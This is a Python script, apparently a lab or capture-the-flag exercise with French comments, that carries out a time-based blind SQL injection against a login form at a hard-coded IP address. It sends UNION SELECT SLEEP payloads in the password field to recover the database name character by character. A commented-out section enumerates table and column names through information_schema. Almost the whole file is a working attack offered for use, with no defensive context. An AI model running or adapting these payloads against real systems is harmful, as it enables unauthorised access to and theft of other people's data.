import requests
import time

def nom_user_db():
    dictionary = "abcdefghijklmnopqrstuvwxyz_"
    a=0
    db_names = []
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 99):
        for j in range(0, len(dictionary)):
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            if a >= 28:
                exit()
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    return texte

nom_user_db()

"""
url = 'http://51.15.136.118/pageid.php'
db_names = get_db_names(url)
print(db_names)


for db_name in db_names:
    tables = get_tables(url, db_name)
    for table in tables:
        columns = get_columns(url, db_name, table)
        print("Table: {}, Columns: {}".format(table, columns))

        
def get_tables(url, db_name):
    tables = []
    for i in range(1, 20):
        query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{}' LIMIT 0,1 OFFSET {} --".format(db_name, i)
        start_time = time.time()
        response = requests.post(url, data={'username': query, 'password': query})
        end_time = time.time()
        total_time = end_time - start_time
        if total_time > 5:
            tables.append(response.text)
    return tables

    
def get_columns(url, db_name, table_name):
    columns = []
    for i in range(1, 20):
        query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}' LIMIT 0,1 OFFSET {} --".format(db_name, table_name, i)
        start_time = time.time()
        response = requests.post(url, data={'username': query, 'password': query})
        end_time = time.time()
        total_time = end_time - start_time
        if total_time > 5:
            columns.append(response.text)
    return columns
"""